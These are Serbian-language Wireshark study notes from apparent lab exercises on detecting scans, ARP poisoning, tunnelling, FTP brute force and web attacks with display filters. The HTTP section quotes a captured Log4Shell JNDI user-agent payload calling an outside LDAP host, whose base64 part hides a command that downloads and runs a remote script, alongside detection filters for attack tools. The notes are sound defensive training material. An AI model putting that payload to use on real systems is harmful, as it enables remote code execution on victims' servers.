# Wireshark, beleske, vezbanje, zadaci

WireShark je alat koji nije primarno IDS nego samo radi dubinsku analizu i istrazivanje paketa. Ne modifikuje pakete, vec ih samo cita...  
Wireshark je GUI alat.  

otvorimo trazeni fajl kroz wireshark i idemo na statistic > capture file properties i nadjemo flag u komentarima fajla  

u capture file properties vidimo i koji je ukupan broj paketa. Na ovom mestu imamo i hes fajla i mnoge druge podatke   

# disekcija paketa i detalji paketa

wireshark koristi OSI slojeve za razlaganje paketa.  

Kada kliknemo na paket jednom ili dva puta onda dobijemo njegove detalje  

1. Frame sloj: vidimo detlaje; za fizicki sloj OSI modela 
2. Source [MAC] sloj: vidimo izvorne i odredisne MAC adrese; iz Data link sloja OSI
3. Source [IP] sloj: vidimo izvorne i odredisne ipv4 adrese; iz Network sloja 
4. Protokol: pokazuje detalji koji su protokoli korisceni i izvorni i odredisni port; iz trnasportnog sloja
- greske protokola takodje pripadaju 4.tom sloju. Prikazuje specificne segmente iz TCP-a koje bi trebalo ponovo sastaviti
5. Aplication protocol: ovaj sloj pokazuje detalje specificne za koriscene protokole (http, ftp i smb); iz aplikacijskog sloja 
- application data: produzetak 5.og sloja koje nam pokazuje specificne aplikacione protokole i njihove detalje 

kada otvorimo ove slojeve vidimo razlicite informacije  

zadatak je da se istrazi paket... da odgovorimo na pitanja potrebno je istrazivati razlicite stake paketa, koji su uglavnom lako uocljivi  

poslednji zadatak je da se prosle e-tag value. Za to moramo da idemo u http sekciju nadjemo E-tag > desni klik na njega > copy  > value  

**pronalazak paketa:**
- go > go to packet -opcije u wireshark meniju: otvori se meni za pretragu paketa po id-ju  
- edit > find packet -pronadji paket po sadrzaju (pretrage mozemo podesiti da budu osetljiva na velika i mala slova)  

> oznacavanje paketa, ako zelimo da oznacimo nesto na sta treba obratiti paznju... desni klik na paket > mark/unmark

> dodavanje komentara paketa desni klik > packet comment  

> posto wireshark nije IDS nekad je potrebno izvesti pakete na dalju obradu... file > export specified packet 

> takodje postoji i izvoz objekata ali samo za odredjene protokole file > export objects (ovo je znacajno da se otkriju deljene datoteke i za dalju istragu)  

> format prikaza fremena, podrazumevano u wiresharku su postavljene sekunde od pocetka snimanja a mi bi trebali promeniti u UTC date and time of day (view > time display format)  

> analyze > expert information -da vidimo poruke i specificna stanja protokola koji mogu da ukazuju na anomalije i probleme  
> ovde moze da se udje i skroz u donjem levom cosku crvena ikonica

**u jednom zadatku se trazi da se istraze komentari paketa**

sa opcijom go to packet pronadjemo paket po id-ju

- u komentaru ovog paketa se nalazi uputstvo da skocimo na drugi paket i istrazimo jpg deo tog paketa (dobijemo id)  
- odemo na jpg i exportujemo na desktop (desni klik na jpg deo paketa > export packet bytes i sacuvamo na desktop)
- kada sliku sacuvamo na desktop idemo kroz terminal do nje i uradimo > md5sum slika.jpg
- drugi nacin za ovo bez pronalaska paketa preko id-a nego odmah kroz: file > export objects > http > pretrazimo sa jpg i onda vidimo broj paketa

**potrebno je naci nesto iz nekog .txt fajla**

- file > export objects > odaberemo http > u pretragu kucamo txt > i cuvamo na desktop taj pronadjeni fajl (koji odgovara id-ju paketa), zatim otvorimo i procitamo flag 
- drugi nacin da nadjemo paket po id-ju (paket iz prethodnog zadatka) i nadjemo pod HTTP > line based text data

**procitati koliko ima warning-a**

- odemo u expert information i prosirimo postojeci prozor da bi mogli da vidimo na desnoj strani ukupan broj za alert koji nas interesuje  

# filtriranje paketa 

wireshark ima mocan mehanizam koji filtrira pakete, koji omogucava suzavanje saobracaj i fokus na dogadjaje koji nas zanimaju  

kliknemo na polje paketa koje zelimo da filtriramo i desni klik > conversation filter

u istom meniju imamo i colorise conversation koji se koristi da oboji i istakne pakete sa primenom filtera i one bez primene filtera. Radi na principu pravila bojenja. Boja na istom mestu moze da se i resetuje  

ove dve opcije mogu da se pokrenu kroz view karticu  

desni klik > pripremi kao filter -znaci da kreiramo filter, dodaje upit i ceka komandu za izvrsenje 

analyze > primeni kao kolonu -pruza osnovne informacije o svakom paketu (moze se uci i preko desnog klika)  

pracenje strima je opcija koja nam omogucava rekonstruisanje tokova i prikaz sirovog saobracaja kako je predstavljen na nivou aplikacije (moze i preko menija desnog klika ili `analyze > follow`)  

**pronaci paket 4 i u njemu http i primeniti ga kao filter**

- desni klik na http > primenim ga kao filter (gore u traci gde se kuca tekst on automatski popuni i vidimo koji je filter query: http)  

**koliko je ukupno ostalo paketa nakon primene filtera**

- to vidimo skroz dole u traci pod 'displayed'

**otici na paket 33790, pratiti http stream i videti odgovore. Proveriti odgovore na veb serveru i odgovoriti kolikko je ukupno umetnika**

- u zadatku kaze da se radi sa: desni klik na paket > follow > tcp stream, ali ja tako ne mogu da nadjem resenje
- radim file > export object > u pretragu za export kucam artist i prikaze se artist.php (proverim da je to taj id paketa koji trazim) i onda sacuvam fajl na desktop. Nakon toga otvorim fajla (sa pluma) i pronadjem koliko ima artista u kodu (artist=1, ...)  

# WireShark Packet Operations 

meni statistika pruza dosta dodatnih opcija: 

- resolved address: prikazuje razresene ip adrese i dns
- protocol hierarchy: prikazuje statistiku koriscenih protokola i portova 
- conversations: prikazuje listu razgovora izmedju dva endopoint-a (ethernet, ipv4, ipv6, TCP, UDP) 
- endopoints: slicno konverzacijama ali prikazuje info za jedno specificno polje. Takodje postoji opcija name resolution da pretvara mac adrese u format citljiv ljudima (dostupno samo za eternet)

takodje postoje opcije za razresavanja ip iu port imena, ali ova opcija mora da se omoguci u edit > preferences > name resolution  

wireshark pruza i mapiranje geolokacije na IP adresu (odredjivanje izvorne i odredisne adrese). Funkciju je potrebno aktivirati na edit > preferences > name resolkution > maxMind database. Ove informacije ce se nalaziti u detlajima IP protokola za podudarne adrese (u endpoints). Da bi se videla geolokacija potrebna je internet veza ali VM za vezbu nema.  

**pronaci ip adresu za hostname koji pocinje sa bbc**

ovo trazimo u statistics > resolved addres i tu imam pretragu da kucam 

**koliko ukupno ima ipv4 konverzacija**

ovo trazimo statistic > conversations i odmah u kartici za ipv4 vidimo broj (samo sacekati da se ucita sve)

**koliko bajtova je prebaceno od micro st mac adrese**

sad odem na statistic > endopints i ukljucim name resolutions i pronadjem mac adresu 

**koji je broj ip adresa povezanih sa kansas city**

prvo moram ukljuciti opciju:  edit > preferences > name resolution > maxMind database.   

Onda pogledati u endpoints

**koja ip adresa je povezana sa blicnet organizacijom**

edit > preferences > name resolution i ukljucim resolve ip addres (a mogu i transport names)  

iskljucim name resolution da bih video adresu 

### u statistici imamo jos opcija za prikaz

u tabu statistic imamo jos:

- ipv4 ipv6 prikazuje sve opcije za obe verzije ip adresa. Mozemo prikazati sve dogadjaje povezane sa odredjenima dresama u jednom prozoru 
- dns: prikazuje ukupnu upotrebu dns servisa (rcode, opcode, class, query type, query stats)
- http: vidimo kodove zahteva i odgovora na originalne zahteve

**koja je najcesca odredisna adresa**

vidimo u statistic > ipv4 > source and destination adress > zatvorimo surce deo i sortiramo po count prikaz

**koji je max vreme zahteva i odgovora na uslugu za dns pakete**

statistic > dns i pod service stats nadjemo max vrednost  

**koliki je broj ip zahteva koje je izvrsio rad[.]msn[.]com**

statistic > http > load distribution i malo je teze pronaci za ovu adresu ukupno, jer se pojavljuje na vise ispisa i tesko je prepoznati koje je ukupno 

# Packet filtering - principles 

capture > capture filter je pregled filtera za hvatanje saobracaja  

ovo je najmocnija funkcija wireshark-a. Podrzava 3000 protokla i omogucava pretragu na nivou paketa sa detaljnim pregledom  

pregled filtera analyze > display filters 

operatori za filtriranje su isti kao i u programiranju (`!=, ==, &&, ||` itd.)  

traka sa filterima boji filtere kao vazeci, nevazeci i upozorenje (odnosi se se na rad filtera)  

filteri se kucaju u traku iznad prikaza paketa i tu imamo jos opcija za filter...   

primer ip filtera:  

- `ip.addr == neka adresa/24` prikazi sve pakete koji sadrze ip adrsu ili adrese iz podmreze  
- `ip.src` izvorna adresa 
- `ip.dst` odredisna adresa  

primer tcp/udp filtera:  

- `tcp.port == 80 ili udp.port == 80`
- `tcp.srcport == xx` `udp.srcport == xx` 
- `tcp.dstport == xx` `udp dstport == xx`

drugi filteri:  

- `http` prikazi sve http pakete  
- `dns` prikazi sve dns pakete  
- `http.response.code == 200` prikazi sve http sa 200 OK  
- `dns.flags.response == 0` - prikazi sve dns zahteve  
- `dns.flags.response == 1` - prikazi sve dns odgovore  
- `http.request.method == "GET"` http get metoda 
- `dns.qry.type == 1` prikazi sve DNS A zapise (a zapis osnovni tip zaipsa koji prikazuje ime domena i ip adresa)  

wireshark ima opciju analyze > display filter expression. Ovde vidimo detalje za odredjeni protokol i ostale informacije koje se mogu dodeliti nekom filteru  

**koliki je broj ip paketa**

u polje za fitler unosim samo `ip` i procitam dole broj prikazanih paketa 

**koji je broj paketa sa TTL value less than 10?**

pisem filter: `ip.ttl < 10`  

**koji je broj paketa koji koristi TCP port 4444**

`tcp.port == 4444`

> kad kucam filtere cak mi i izadje pomoc u vidu auto-complete

**koji je broj http get zahteva poslatih na port 80re**

ovde moram kombinovati dva upita sa and: `http.request.method == "GET" && tcp.dstport == 80`

**koji je broj type A DNS query-ja**

`ns.qry.type == 1`  

ovde postoji problem jer meni primenom ovog filtera pokazuje da je resnje 106 (a to nije resenje)  

isti je problem kad apokusam preko analyze > display filter expression i odaberem filter za dns qry type  

treba da se primeni i filter za flag response jer nam bez toga trazeni rezultat nije tacan  

**resenje je:**  

`dns.qry.type == 1 && dns.flags.response == 1`

# napredni filteri  

`filter contains: http.server contains "Apache"` svi http paketi ciji server sadrzi odredjene reci    

`filter matches: http.host matches "\.(php|html)"` svi http paketi ciji hostovi sadrze .php ili .html  

`filter in: tcp.port in {80 443 8080}` svi tcp paketi ciji portovi sadrze odredjene vrednosti  

`filter upper: upper(http.server) contains "APACHE"` svu http paketi i njihovi serveri to uppercase koji sadrza odredjenu rec  

`filter lower: lower(http.server) contains "apache"` isto samo lowercase  

`filter string: string(frame.number) matches "[13579]$"` konveruj sve frame number u string vrednosti i navedi frejmove koji zavrsavaju neparnim vrenodstima  

pored polja za unos filtera imamo dugme obelezivac da ih mozemo koristiti vise puta bez ponovnog kucanja, kad kliknemo na to dugme:
save this filter > new display filter 

wireshark profli sluze za pamcenje konfiguracija sto je kosirno za za svaki slucaj istrazivanja koji zahteva drugaciji skup pravila bojenja i dugmadi za filtriranje
edit > configuration profiles > default na desni klik imamo switch to > pa nas novi default profil  

**pronadji sve microsoft IIS servere. koji je broj pakete koji ne poticu sa porta 80**

`http.server contains "IIS" && tcp.srcport != 80`  

**sve microsoft iis servere ciji je broj paketa ima berziju 7.5**

`http.server contains "Microsoft-IIS/7.5"`

**ukupan broj paketak koji koriste portove 3333, 4444, 9999**

`tcp.port in {3333 4444 9999}`

**broj paketa koji je paran TLL**

`string(ip.ttl) matches "[02468]$"`

**promeni profil na checksum control, koji je broj bad tcp checksum paketa**

edit > config profiles > checksum control profile  

nakon toga otvorim analyze > display filter expression >  i kreiram filter pod TCP: tcp checksum status == bad kreirani filter izgleda ovako: `tcp.checksum.status == 0`

Use the existing filtering button to filter the traffic. What is the number of displayed packets?

**koristi postojece dugme za filtriranje saobracaja, koji je broj paketa sa tim filterom?**

ovo dugme se nalazi odmah sa desne strane na kraju trake-prozora za kucanje filtera, kada se odabere checksum profile, klikom na to dugme treba da dobijemo predefinisani upit  

filter je:  `(http.response.code == 200 ) && (http.content_type matches "image(gif||jpeg)")`

# Wireshark - traffic analysis  

# nmap scans

nmap skeniranje: skeniranje TCP konekcija, SYN i UDP  

SYN, REST i ACK su nam flagovi koji nam opisuju proces rukovanja otvaranja i zatvaranja tcp portova  

**tcp skeniranje: nmap -sT**  

oslanja se na trosmerni hendshak-e, koriste ga neprivbilegovani korisnici (koji nisu root), obicno velicina veca od 1024 bajta jer zahtev ocekuje neke podatke  

otvaranje tcp porta: syn - syn,ack - ack  
otvaranje tcp porta: syn - syn,ack - ack - rest, ack  
zatvorenui tcp port: syn - rst,ack  

wireshark filter za sleniranje tcp connect-a: `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024`
  
**tcp syn skeniranje: nmap -sS**  

nema trosmerno rukovanje, koriste privilegovani useri, obicno je velicina manja ili jednaga 1024 bytes, ne ocekuje se prijem podataka  

otvori tcp port: syn - syn,ack - rst  
zatvori tcp port: syn - rst,ack  

wireshark filter za prikaz TCP SYN skeniranja: `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024`  

**udp scan: nmap -sU**

ne oslanja se na trosmerno rukovanje, nema upit za otvorene portove, ICMP poruka o gresci za zatvaranje portova  

otvaranje udp porta: udp paket  
zatvaranje udp porta: udp paket-icmp type3, code 3 messsage (destination unreachable, port unreachable)  

wireshark filter za udp obrasce skeniranja: `icmp.type==3 and icmp.code==3`  


**koji je ukupni broj tcp connect skeniranja**

u wireshark ubacimo trazeni fajl za vezbu...  

primenimo filter za tcp: `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024`  

**koji je tip skeniranja koriscen da skenira tcp port 80**

prvo primenimo filter: `tcp.port == 80`  

tu vidimo sablone syn-syn,ack-rst,ack i taj sablon odgovara tcp connect skeniranju 

**koji je broj poruka: zatvoren udp port**

`icmp.type == 3 and icmp.code == 3`

**koji udp port u opsegu 55-70 je otvoren**  

`udp.dstport >= 55 and udp.port <= 70`

kada primenimo ovaj filter videcemo skeniranja koja se vracaju sa unreachable portove, na jednog njih kliknemo i proverimo pod control message protokol koji je port u pitanju  

posto imamo 3 poruke (icmp greske), kada istrazimo svaku dodjemo do toga da su zatvoreni portovi: 69, 57  

onda je preostali port - 68 onaj koji nije vratio gresku. Ovo mozemo da vidimo i u prikazu nakon filtriranja. Skenirani portovi sa greskom su obojeni drugacije.  

nase je samo da pretrazimo portove koji nisu vratili gresku a da su u opsegu 55-70  

# arp poisoning (man in the middle)

arp protokol: radi na lok mrezi, omogucava komunikaciju izmedju mac adresa, nije bezbedan protokol, nije protokol za rutiranje, nema funkciju autentifikacije, uobicajeni obrasci su zahtev odgovor najava i besplatni paketi  

legitiman arp zahtev je kada proveravamo da li neki od dostupnih hostova koristi ip adresu i odgovor od hosta koji koristi odredjenu ip adresu  

zahtev je u wiresharku prikazan sa reci who has [ip adresa], a odgovor je samo [adresa]

wireshark filteri: 

- `arp.opcode == 1` kod 1 arp zahtev  
- `arp.opcode == 2` kod 2 arp odgovor  
- `arp.dst.hw_mac==00:00:00:00:00:00` pretraga, arp skeniranje 
- `arp.duplicate-address-detected or arp.duplicate-address-frame` moguce otkrivanje arp trovanja 
- `((arp) && (arp.opcode == 1)) && (arp.src.hw_mac == target-mac-address)` moguce arp preplavljivanje zbog detekcije 

sumnjiva situacija je kada postoji dva razlicita odgovora za odredjenu ip adresu. Medjutim pojavljuje se samo druga vrednost u odgovoru ip adrese   

sumnjiva situacija je kada na arp zahtev dobijemo vise odgovora. Kada kliknemo na dogadjaj vidimo da imamo kod koji govori na dupliranu ip adresu  

**koji je broj arp zahteva koje je napravio napadac**  

ubacimo fajl u wireshark koji je za ovaj zadatak...  

prvo kucamo pretragu skeniranja: `arp.dst.hw_mac==00:00:00:00:00:00`  

kada nam ovo izbaci rezultate idemo desni klik na sumnjivu aktivnost i `applay as filter > ...and selected`. Sa ovim uzimamo mac adresu. Filter sada izgleda ovako `(arp.dst.hw_mac==00:00:00:00:00:00) && (eth.src == 00:0c:29:e2:18:b4)`    

na kraj filtera dodajemo `&& (arp.opcode==1)` da bi smo istrazili samo arp zahteve umnjivog karaktera  

konacan filter izgleda ovako: `(arp.dst.hw_mac==00:00:00:00:00:00) && (eth.src == 00:0c:29:e2:18:b4) && (arp.opcode==1)` i onda vidimo koji je ukupan broj zahteva   

**koliki je broj http paketa koje je napadac primio**

primenimo filter iz prethodnog zadatka. Odaberemo jedan dogadjaj i kliknemo na njega. Ona gledamo njegove detalje `Ethernet > source > address i onda na to desni klik > apply as filter > selected`  (samo selected ne ...and selected jer ce tad na postojeci upit dodati ovaj)  

filter koji dobijemo sa ovim je: `eth.addr == 00:0c:29:e2:18:b4` i mi na njega rucno dodamo jos and http, tako da je konacni filter:  

- `eth.addr == 00:0c:29:e2:18:b4 && http`

**koliki je broj proverenih unosa username password**

kada rasirimo wireshark prozor do kraja pod info (podaci nad kojim je primenjen poslednji http filter) gledam URI da nadjem neku formu.  

kada sam nasao uri forme vidimo da se radio i POST zahtev. Kada pogledamo u detlajima (pod HTML form url encoded) vidimo uname i pass vrednosti koje su prosledjene  

dalje trazimo pod hypertext transfer protocol > post /userinfo.php desni klik na ovo > apply as filter > ...and selected (da ga zalepi sa and na prethodni filter)  

na kraju filter je: `(eth.addr == 00:0c:29:e2:18:b4 && http) && (frame[54:29] == 50:4f:53:54:20:2f:75:73:65:72:69:6e:66:6f:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a)`  

ono sto dobijemo primenom filter pogledamo i vidimo u detalje da li negde ima prikazana lozinka. Negde ima negde ne, potrebno je rucno ici i brojati gde se pojavljuje lozinka da bi smo dali konacan broj

**koja je lozinka od client986**

znaci ostanemo na rezultatu iz prethodnog zadatak i pretrazujemo rucno da vidimo koja je lozinka od rezultata filtriranja. Lozinka se nalazi na poslednjoj stavci u detaljima html form url encoded  

**koji je komentar od client354**

> primenjen je filter iz proslog zadatka `(eth.addr == 00:0c:29:e2:18:b4 && http) && (frame[54:29] == 50:4f:53:54:20:2f:75:73:65:72:69:6e:66:6f:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a)`  

obrisemo filter do ovog dela sve, znaci samo ovo ostane `(eth.addr == 00:0c:29:e2:18:b4 && http)`, nakon toga idemo na detalje (tamo gde smo gledali lozinku) i desni klik na html form url encoded apply as filte > and selected  

konacan filter izgleda ovako: `((eth.addr == 00:0c:29:e2:18:b4 && http) ) && (urlencoded-form)`  

- onda na dobijenim rezultatima idemo i gledamo za korisnika client354 trazimo komentar koji je ostavio u toj formi  

# identify host: DHCP, NetBIOS, Kerberos

# DHCP

u poslovnim mrezama se zna unapred odredjeni sablon identifikacije hostova (imena hostova)  

dhcp je protokol za automatsko dodeljivanje ip adresa i drugih parametara komunikacije

wireshark filteri: 

- `dhcp` ili `bootp` 
- `dhcp.option.dhcp == 3` - zahtev, sadrzi informaciju o imenu hosta 
- `dhcp.option.dhcp == 5` - ACK, prihvaceni zahtevi  
- `dhcp.option.dhcp == 6` - NAK, odbijeni zahtevi 
- `dhcp.option.hostname contains "keyword"` - zatev: imena hosta, ip adrese, zakup ip adrese, mac klijenta
- `dhcp.option.domain_name contains "keyword"` - ack: ime domena i dodeljeno vreme zakupa
- nak - preporuka da se cita umesto da se filtrira  (poruka detalji, razlog, odbijanja)

# NetBIOS (NBNS)

omogucava aplikacijama na razlicitim hostovima da medjusobno komuniciraju  

wireshark filter: 

- `nbns`
- `nbns.name contains "keyword"`  

# Kerberos 

podrazumevan za auth microsoft windows domena. Autentifikacija 2 ili vise racunara preko nepouzdane mreze  

wireshark filter:

- `kerberos` 
- `kerberos.CNameString contains "keyword"` `kerberos.CNameString and !(kerberos.CNameString contains "$")` username: vrednosti bez $ su korisnicka imena a kad primenimo $ onda dobijamo imena hostova  
- `kerberos.pvno == 5` `kerberos.realm contains ".org"` `kerberos.SNameString == "krbtg"` ime domena za generisani tiket i client ip adresa. Informacije o adresam su samo u zahtevu paketa 

**pronaci mac adresu hosta "Galaxy A30"**

prvo u wureshark ubacimo trazeni fajl  

primenimo ovaj filter i pod dhcp u detaljima nadjemo mac adresu

`dhcp.option.hostname contains "A30"`

**koliko netbios registracionih zahteva ima radna stanica "LIVALJM"**

da bih sklopio filter moram da idem na analyze > display filter expression > nbns:

- pod filter nbns.flags.opcode idem na == i na  registration i tako smo formirali jedan deo filtera 
- onda opet pod nbns.name odaberemo matches i upisemo vrednost. Ova dva filtera spajamo sa and (&&)  

`nbns.flags.opcode == 5 && nbns.name matches "LIVALJM"`

**koji host je trazio (request) adresu 172.16.13.85**

`dhcp.option.dhcp == 3 && dhcp.option.requested_ip_address == 172.16.13.85`

i onda u detalje idem pod dhcp > option host name i nadjem 

**koja je ip adresa usera u5 (defang format)**

u wireshark ubacujemo drugi fajl  

primenimo filter i pogledamo adresu u detaljima i vratimo kao defang (gde god su . pise se [.], uglavnom je ovako za ip adrese ali ima na CyberChef da se izgenerise)  

`kerberos.CNameString contains "u5"`

**koji hostname je dostupan host u kerberos paketima**

primenimo filter i idemo u detlajie na: kerberos > cname > cname string

`kerberos.CNameString contains "$"`

# Tunneling traffic: DNS, ICMP  

tunneling je zapravo preusmeravanje portova, bezbedan prenos podataka ka segmentima i zonama mreze. Spaja privatnu mrezu sa internetom i obrnuto  

# icmp analiza  

icmp je protokol za kontrolne poruke i dizajniran je za dijagnostifikovanjei prijavljivanje problema u mreznoj komunikaciji. Protokol je mreznog sloja i koristi ze za DoS napade i kradje podataka C2 tunelovanja  

icmp napadi pocinju nakon izvrsavanja zlonamernog softvera ili iskoriscenja ranjivosti. icmp paketi mogu da prenesu dodatni teret podataka (napad na c2: http, tcp, ssh). Praksa je da se blokira koriscene ili da se zahtevaju administratorske privilegije za kreiranje perosnalizovanih icmp paketa  

napad je tako sto se kreira paket koji odgovara redovnoj icmp velicini (64 bajta) tako da je ponekad tesko otkriti.  

wireshark filter:

- `icmp`
- `data.len > 64 and icmp`

# dns analiza  

dns je zaduzen za konvertovanje ip adresa domena u ip adrese (iz logickih u fizicke). Posebno je ranjiv na izmene lokalnog dns fajla (kada poznate dns prevedene adrese ne zahteva od provajdera nego cita lokalno iz fajla kako bi ustedio operaciju) - **to sam radio na pentestingu**  

isto kao icmp tunneling pocinju nakon izvrsavanja zlon. softvera ili iskoriscenja ranjivosti  

napadaci nakon upada salju upite dns c2 serveru i onda izvrsavaju komande, zapravo sa nekog sajta koji izvrsava komande (jer su upiti duzi i kreirani za adrese poddomena)  

kada se ovi upiti usmere ka c2 serveru on nazad vraca komande. Dns je prirodniji deo mrezne aktivnosti i postoji mogucnost da mrezni parametri ne otkriju ove pakete  

wireshark: 

- `dns`
- `dns.contains "dsncat"` `dns.qry.name.len > 15 and !mdns` !mdns znaci onemoguci lok upite uredjaja za povezivanje 

**istraziti anomalicne pakete, koji protokol je koriscen za icmp tunneling**

u wireshark ubacimo odgovarajuci fajl, izvrsimo komandu i pogledamo 

`data.len > 64 and icmp`

medjitum ovaj filter nije dovoljan zbog velikog broja rezultata pa treba jos dodati slucajeve  

`(data.len > 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http")`

kako znati koji je protokol? Tako sto jednostavno brisem slucajeve za ssh, ftp tcp i http. Za koji prikaze rezultat taj je protokol koriscen... malo je siledzijsko resenje, mogu se gledati bajtovi paketa i druge stvari ali je ovako lakse  

**istraziti anomalicne pakete. koji je sumnjiva glavna domen adresa koja prima lose dns upite (adresa u defang format)?

primenimo filter i gledamo sirove bajtove paketa da bi smo provalili koji je glavni domen, .com je dobar izbor jer trazimo top level domen, ali moze lako da bude nesto drugo    

kada kliknemo na deo sirovih bajtova on nam u levom meniju detalja oznaci to mesto i onda vidimo gde i kako je sortirano i druge neke detalje  

`dns.qry.name.len > 40 and !mdns && dns.qry.name contains ".com"`

# analiza FTP  

ftp je protokol koji je dizajniran za lak prenos fajlova, i zapravo je vise jednostavan nego bezbedan  

wireshark filteri: 

- `ftp`
- 200 znaci da je komanda uspesna
- `ftp.response.code == 211` x1x serija opcija: sistem, directory i file status 
- `ftp.response.code == 227` x2x: servis spreman, ulazak u pasivni mod, dugacak i produzen pasivni mod
- `ftp.request.command == "USER"` `ftp.request.command == "PASS"` `ftp.request.arg == "password"`
- `ftp.response.code == 530` `(ftp.response.code == 530) and (ftp.response.arg contains "username")` `(ftp.request.command == "PASS" ) and (ftp.request.arg == "password")` bruteforce i password spray signali

**koliko je pogresnih login-a**

ubacimo odgovarajuci fajl za ovu vezbu i primenimo filter  

`ftp.response.code == 530`

**kolika je velicina fajla kojoj pristupa ftp account**

primenimo filter i u detlajima pod ftp > response arg vidimo velicinu  

`ftp.response.code == 530``

**protovnik je otpremio koji dokument na ftp server - ime datoteke**

primenimo filteri i pronadjemo pod ftp ime fajla (komanda moze da bude i STOR)  

`ftp.request.command == "RETR"`
 
**napadac pokusava da dobije pristup flagovima da promeni permission uplode-ovanog fajla, koja je komanda? (na linuxu je chmod)**

izvrsimo upit i u detaljima ftp vidimo komandu  

`ftp contains "CHMOD"`

# analiza HTTP 

protokol koji jse koristi za klijent server arhitekturu: zahtev-ogovor  

najcesci napadi preko http: phising, web napadi, izvlacenje podataka, komandovanje i kontrola c2 saobracaja   

wireshark: 

```
http 
http2 - verzija sa boljom bezbednosti i performansama, podrazumeva prenos bin podataka i multipleksiranje zahteva i odgovora 
```

```
http.request.method == "GET"
http.request.method == "POST"
http.request
```

```
http.response.code == 200 
http.response.code == 401 
http.response.code == 403 
http.response.code == 404
http.response.code == 405
http.response.code == 503
```

> PODSETNIK: 
> 200 OK: Request successful.
> 301 Moved Permanently: Resource is moved to a new URL/path (permanently).
> 302 Moved Temporarily: Resource is moved to a new URL/path (temporarily).
> 400 Bad Request: Server didn't understand the request.
> 401 Unauthorised: URL needs authorisation (login, etc.).
> 403 Forbidden: No access to the requested URL. 
> 404 Not Found: Server can't find the requested URL.
> 405 Method Not Allowed: Used method is not suitable or blocked.
> 408 Request Timeout:  Request look longer than server wait time.
> 500 Internal Server Error: Request not completed, unexpected error.
> 503 Service Unavailable: Request not completed server or service is down.

``` 
http.user_agent contains "nmap"  -identifikacija browsera i os-a za serversku aplikaciju 
http.request.uri contains "admin"  -uri - trazeni resurs sa servera
http.request.full_uri contains "admin"  -kompletne informacije u url-u 
```

```
http.server contains "apache"  -naziv servisa 
http.host contains "keyword"
http.host == "keyword"
http.connection == "Keep-Alive"   -status veze
data-text-lines contains "keyword"  --informacije o veb obrascu 
```

`http.user_agent`
`(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")`

```
poznata java ranjivost. „jndi:ldap “ и „ Exploit.class “

http.request.method == "POST"
(ip contains "jndi") or ( ip contains "Exploit")
(frame contains "jndi") or ( frame contains "Exploit")
(http.user_agent contains "$") or (http.user_agent contains "==")
```


**istraziti user agente, koji je broj anomalnih user agent tipova**

postavimo odg fajl u wireshark i primenimo filter. Kada primenimo filtert idemo na detalje http > user agent > desni klik apply as column da imamo u prikazu i user agenta.  

Nisam skontao kako treba da prepoznam koji je anomalan user agent, verovatno kad vidim nesto sumnjivo u njemu, ali meni windows NT 6.4 nije sumnjiv npr, tako da ne znam ovo da resim i skontam

`http.user_agent`

Anomalni user agneti:  

> Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10  -ovo je sumnjivo nzm zasto  

> Mozilla/5.0 (compatible; Nmap Scripting Engine; https[://]nmap[.]org/book/nse[.]html)  -skener portova   

> Wfuzz/2.4   -alat za bruteforce   

> sqlmap/1.4#stable (http[://]sqlmap[.]org)  -automatski sql injection
> ${jndi:ldap[://]45[.]137[.]21[.]9[:]1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}  -logshell, daljinsko izvrsavanje   

> Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0  

> curl/7.68.0	-CLI alat, često korišćen za testiranje i napade  

> python-requests/2.25.1	-Python skripta  


ovo vazi sve pod uslovom da napadaci ne sakrivaju alat koji koriste !! 

**koji je broj paketa sa pravopisnom razlikom u user agent polju**

primenimo filter i dodamo user agnet iz detalja kao kolonu... gledamo sta ima sumnjivo, mozila sa jednim L i kliknemo na nju i vidimo da ima 52 paketa ukupno 

`http.user_agent`

**lociraj log4j napad start fazu, koji je broj paketa (ne ukupan broj nego broj tog paketa koji otkrijemo)**

koristimo drugi fajl za ovu vezbu  

primenimo filter i onda u detaljima http user agent kopiramo i dekodujemo iz base 64. tu vidimo da se koristi komanda wget

`(http.user_agent contains "$") or (http.user_agent contains "==")`

ovde imamo srece i prvi paket po redu vidimo kad smo dekodovali base 64 user agenta da je koristio wget da preuzme nesto, znaci to nam je pocetak svega...  

**koja je adresa iz base64 enkodovanog user agneta iz pocetne startne faze? Defang format.**  

znaci istog user agenta iz prethodnog zadatka enkodujemo, vidimo onu wget komandu, iz nje uzmemo ip adresu i uradimo defang.  

defang i enkodovanje radim na cyber chef, ali defang mogu i rucno, umesto . stavljam [.]   

# analiza HTTPS  

HTTPS koristi TLS protokol za zasticenu komunikaciju, vise je otporan na presretanje. Nemoguce je pregledati prenete podatke bez parova kljuceva  

wireshark filteri: 

- `http.request`
- `tls`  
- `tls.handshake.type == 1` zahtev tls klijenta 
- `tls.handshake.type == 2` odgovor tls servera 
- `ssdp` mrezni protokol koji omogucavanja oglasavanje i otkrivanje mreznih usluga  

- Hello klijentu: `(http.request or tls.handshake.type == 1) and !(ssdp)`
- Hello serveru: `(http.request or tls.handshake.type == 2) and !(ssdp)`

datotetka za sifrovanje kljuceva sadrzi jedinstvene parove kljuceva sifrovanog saobracaja. Kljucevi se automatski kreiraju po sesiji (tj. kada se uspostavi veza sa veb stranicom koja podrzava ssl/tls)  

ovo se odvija u pregledacu i potrebno je konfigurisati sistem da bi smo ove vrednosti sacuvali u fajl.  

da bi to uradili treba da podeismo promenljivu okruzenja i kreiramo SSLKEYLOGFILE, a pregledac ce kreirati kljuceve i zapisivati u ovaj fajl dok pregledamo web.  

